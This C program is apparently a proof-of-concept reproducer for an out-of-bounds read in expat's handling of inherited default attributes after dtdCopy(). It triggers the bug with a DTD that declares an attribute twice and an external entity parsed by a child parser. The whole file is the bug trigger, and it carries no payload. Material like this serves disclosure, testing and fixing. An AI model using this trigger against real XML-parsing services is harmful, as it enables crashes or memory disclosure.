/* PoC: out-of-bounds read of ELEMENT_TYPE::defaultAtts after dtdCopy().
 *
 * Drives only the public expat API.  The root parser reads an internal DTD
 * that declares element "e" twice with an implied attribute "a", then an
 * external general entity reference causes XML_ExternalEntityParserCreate()
 * to copy the DTD into a child parser.  Parsing "<e/>" with the child applies
 * the inherited default attributes.
 */

#include <stdio.h>
#include <string.h>
#include "expat.h"

static const char *const EXTERNAL_CONTENT = "<e/>";

static int
externalEntityRefHandler(XML_Parser parser, const XML_Char *context,
                         const XML_Char *base, const XML_Char *systemId,
                         const XML_Char *publicId) {
  (void)base;
  (void)systemId;
  (void)publicId;
  XML_Parser child = XML_ExternalEntityParserCreate(parser, context, NULL);
  if (child == NULL) {
    fprintf(stderr, "could not create external entity parser\n");
    return XML_STATUS_ERROR;
  }
  enum XML_Status status = XML_Parse(child, EXTERNAL_CONTENT,
                                     (int)strlen(EXTERNAL_CONTENT), XML_TRUE);
  if (status != XML_STATUS_OK)
    fprintf(stderr, "child parse error: %s\n",
            XML_ErrorString(XML_GetErrorCode(child)));
  XML_ParserFree(child);
  return XML_STATUS_OK;
}

static const char *const DOCUMENT
    = "<?xml version='1.0'?>\n"
      "<!DOCTYPE doc [\n"
      "  <!ELEMENT doc (e)>\n"
      "  <!ELEMENT e EMPTY>\n"
      "  <!ATTLIST e a NMTOKEN #IMPLIED>\n"
      "  <!ATTLIST e a CDATA #IMPLIED>\n"
      "  <!ENTITY ext SYSTEM 'ext.ent'>\n"
      "]>\n"
      "<doc>&ext;</doc>";

int
main(void) {
  XML_Parser parser = XML_ParserCreate(NULL);
  if (parser == NULL) {
    fprintf(stderr, "could not create parser\n");
    return 2;
  }
  XML_SetParamEntityParsing(parser, XML_PARAM_ENTITY_PARSING_ALWAYS);
  XML_SetExternalEntityRefHandler(parser, externalEntityRefHandler);

  enum XML_Status status
      = XML_Parse(parser, DOCUMENT, (int)strlen(DOCUMENT), XML_TRUE);
  if (status != XML_STATUS_OK)
    fprintf(stderr, "root parse error: %s\n",
            XML_ErrorString(XML_GetErrorCode(parser)));

  XML_ParserFree(parser);
  printf("done\n");
  return 0;
}
